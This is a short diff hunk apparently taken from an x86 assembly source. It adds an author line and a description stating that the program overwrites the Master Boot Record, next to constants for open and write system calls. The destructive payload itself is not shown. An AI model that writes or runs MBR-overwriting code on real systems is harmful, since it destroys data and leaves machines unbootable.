@@ -1,4 +1,7 @@
 
+; Author: 	Trisna Quebe
+; Description:	Overwrites the Master Boot Record
+
 SYS_OPEN equ		5
 SYS_WRITE equ		4
 O_RDWR equ		2
